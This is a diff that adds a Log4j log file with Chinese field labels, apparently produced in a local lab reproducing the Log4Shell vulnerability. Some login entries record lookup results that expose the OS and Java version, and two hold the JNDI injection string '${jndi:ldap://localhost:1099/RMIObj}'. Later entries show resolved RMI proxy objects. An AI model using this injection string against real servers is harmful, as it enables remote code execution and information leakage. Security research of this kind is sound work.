@@ -1,0 +1,66 @@
+=========================================
+ 日志级别：INFO
+ 日志时间：2023-05-06 19:28:01,713
+ 所属类名：java.util.function.LongFunction
+ 所属线程：main
+ 日志信息：info level
+=========================================
+ 日志级别：WARN
+ 日志时间：2023-05-06 19:28:01,716
+ 所属类名：java.util.function.LongFunction
+ 所属线程：main
+ 日志信息：warn level
+=========================================
+ 日志级别：ERROR
+ 日志时间：2023-05-06 19:28:01,716
+ 所属类名：java.util.function.LongFunction
+ 所属线程：main
+ 日志信息：error level
+=========================================
+ 日志级别：FATAL
+ 日志时间：2023-05-06 19:28:01,716
+ 所属类名：java.util.function.LongFunction
+ 所属线程：main
+ 日志信息：fatal level
+=========================================
+ 日志级别：INFO
+ 日志时间：2023-05-06 19:29:14,753
+ 所属类名：java.util.function.LongFunction
+ 所属线程：main
+ 日志信息：User Drunkbaby login in!
+=========================================
+ 日志级别：INFO
+ 日志时间：2023-05-06 19:30:09,078
+ 所属类名：java.util.function.LongFunction
+ 所属线程：main
+ 日志信息：User Mac OS X 10.16 unknown, architecture: x86_64-64 login in!
+=========================================
+ 日志级别：INFO
+ 日志时间：2023-05-06 19:30:21,655
+ 所属类名：java.util.function.LongFunction
+ 所属线程：main
+ 日志信息：User Java version 1.8.0_65 login in!
+=========================================
+ 日志级别：INFO
+ 日志时间：2023-05-06 19:33:33,283
+ 所属类名：java.util.function.LongFunction
+ 所属线程：main
+ 日志信息：User ${jndi:ldap://localhost:1099/RMIObj} login in!
+=========================================
+ 日志级别：INFO
+ 日志时间：2023-05-06 19:34:56,915
+ 所属类名：java.util.function.LongFunction
+ 所属线程：main
+ 日志信息：User ${jndi:ldap://localhost:1099/RMIObj} login in!
+=========================================
+ 日志级别：INFO
+ 日志时间：2023-05-06 19:38:41,660
+ 所属类名：java.util.function.LongFunction
+ 所属线程：main
+ 日志信息：User Proxy[RemoteInterface,RemoteObjectInvocationHandler[UnicastRef [liveRef: [endpoint:[127.0.0.1:62450](remote),objID:[1bf8a5b1:187f0d5c3ad:-7fff, -4603694340499002954]]]]] login in!
+=========================================
+ 日志级别：INFO
+ 日志时间：2023-05-06 19:40:38,391
+ 所属类名：java.util.function.LongFunction
+ 所属线程：main
+ 日志信息：User Proxy[RemoteInterface,RemoteObjectInvocationHandler[UnicastRef [liveRef: [endpoint:[127.0.0.1:50478](remote),objID:[8b0befe:187f0dd0326:-7fff, 5374834775997880500]]]]] login in!
